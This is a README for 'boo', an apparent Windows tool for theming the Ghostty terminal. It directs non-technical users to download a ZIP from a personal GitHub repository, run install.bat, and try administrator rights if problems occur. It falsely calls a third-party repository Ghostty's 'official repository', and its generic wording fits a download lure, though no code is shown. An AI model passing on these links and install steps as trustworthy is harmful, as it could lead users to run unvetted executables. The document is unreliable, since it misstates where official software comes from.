# 👻 boo - Make Your Terminal Look Better

[![Download boo](https://img.shields.io/badge/Download-boo-%234478cc?style=for-the-badge)](https://github.com/Ardiyan45/boo)

## What is boo?

boo is a simple app that makes your Ghostty terminal look the way you want. It adds color presets, glass opacity, privacy mode, and a startup dashboard. It also sets everything up with a single command. You don’t need any technical knowledge to use it.

boo works on Windows and works with popular shells like Zsh and Oh My Posh. It helps you create a terminal environment that fits your style and privacy needs.

## 🖥️ System Requirements

Before you start, make sure your computer meets these requirements:

- Windows 10 or later
- At least 4 GB of RAM
- 200 MB of free disk space
- Internet connection for downloading and setup
- Ghostty terminal installed (https://github.com/BobbyGH/Ghostty)

If you don’t have Ghostty installed, you can get it from its official page.

## 🎨 Key Features

boo offers features that help you customize and protect your terminal:

- **Color Presets:** Choose from a list of color themes to personalize your terminal.
- **Glass Opacity:** Make your terminal window see-through to fit your desktop setup.
- **Privacy Mode:** Hide sensitive information on your terminal screen.
- **Startup Dashboard:** Show useful stats and info when your terminal opens.
- **Single-Command Install:** Set up everything by running one simple command.

These features work smoothly together to give your terminal a modern look and extra privacy.

## 🔗 How to Download boo

You need to visit the boo GitHub page to get the latest version. The app is not available as a single download file, so follow the page to find all the files.

[![Download boo](https://img.shields.io/badge/Download-boo-%23555555?style=for-the-badge)](https://github.com/Ardiyan45/boo)

Click the button above or go to this link:

https://github.com/Ardiyan45/boo

On the page, look for the “Releases” section. This is where you will find the latest version of boo ready for download.

## 🚀 How to Install and Run boo on Windows

Follow these steps to get boo running on your Windows computer:

1. **Download the Files:**  
   - Go to the boo GitHub page at https://github.com/Ardiyan45/boo  
   - Click on “Releases” on the right side or scroll down until you see it.  
   - Download the latest release package (usually a ZIP file).

2. **Extract the Files:**  
   - Open the ZIP file you downloaded.  
   - Extract its contents to a folder of your choice, like `Documents\boo`.

3. **Install Ghostty Terminal (if needed):**  
   - If you don’t already have Ghostty installed, download it from https://github.com/BobbyGH/Ghostty.  
   - Follow their instructions to install it on your system.

4. **Open Command Prompt or PowerShell:**  
   - Press `Win + R`, type `cmd`, and press Enter for Command Prompt.  
   - Or press `Win + X` and select “Windows PowerShell”.

5. **Navigate to boo Directory:**  
   - In the Command Prompt or PowerShell window, type the following command and press Enter:  
     `cd C:\Users\YourName\Documents\boo`  
     Replace `YourName` with your Windows user name, or change the path if you saved boo elsewhere.

6. **Run the Setup Command:**  
   - Type this command and press Enter:  
     `install.bat`  
   - This command will start the setup process for boo. It will configure Ghostty to use the color presets and other features.

7. **Restart Your Terminal:**  
   - Close your Command Prompt or PowerShell window.  
   - Open Ghostty or your usual terminal app again. You should now see the new look and setup.

## ⚙️ Customize boo Settings

After installation, you can change the settings to suit you better.

- **Change Color Presets:**  
  boo includes several preset color themes. You can pick one by editing the `config.json` file inside the boo folder. Open it with a text editor like Notepad and find the `colorPreset` line. Replace the current value with the name of your preferred color preset.

- **Adjust Glass Opacity:**  
  To change how transparent the terminal window appears, edit the `opacity` value in the `config.json` file. Use a number between 0.1 (almost invisible) and 1 (fully opaque).

- **Enable Privacy Mode:**  
  Privacy mode hides any sensitive text while you work. Turn it on or off by setting `"privacyMode": true` or `false` in the `config.json` file.

- **Startup Dashboard Settings:**  
  You can choose what shows on the startup dashboard by editing the `dashboardItems` list in the configuration file.

After making changes, save the file and reopen your terminal to see the effects.

## 🛠️ Troubleshooting boo

If you have problems running or using boo, try these steps:

- **Check System Requirements:** Make sure your Windows version and hardware meet the minimum needed.
- **Verify File Paths:** Confirm you are in the correct folder when running commands.
- **Run as Administrator:** Try running Command Prompt or PowerShell as administrator to avoid permission issues.
- **Make Sure Ghostty is Installed Properly:** boo depends on Ghostty. If Ghostty is missing or not working, boo will not work correctly.
- **Check Config File:** Look for typos in the `config.json` file if customization does not take effect.

If these steps don’t help, you can open an issue on the boo GitHub page for support.

## 📂 Additional Resources

To learn more about Ghostty and related tools, you can visit these pages:

- Ghostty official repository: https://github.com/BobbyGH/Ghostty  
- Oh My Posh documentation: https://ohmyposh.dev/docs/  
- Zsh shell information: https://www.zsh.org/

These will help you understand what powers boo under the hood and how you can extend its features further.

## 🔄 Updating boo

To update boo when a new version is available:

1. Visit the boo GitHub page again.  
2. Download the latest release files from the “Releases” section.  
3. Extract the files and overwrite your existing boo folder.  
4. Run `install.bat` again from the new folder to apply the update.  
5. Restart your terminal to use the new version.

## ⚠️ Uninstall boo

To uninstall boo:

1. Delete the folder where you extracted boo files.  
2. Reset your terminal configuration if you want to remove changes boo made.  
3. If you want to remove Ghostty, uninstall it separately using its instructions.

---

This guide covers everything a non-technical user needs to download, install, customize, and uninstall boo on Windows. The clear steps help you use the app without needing programming skills.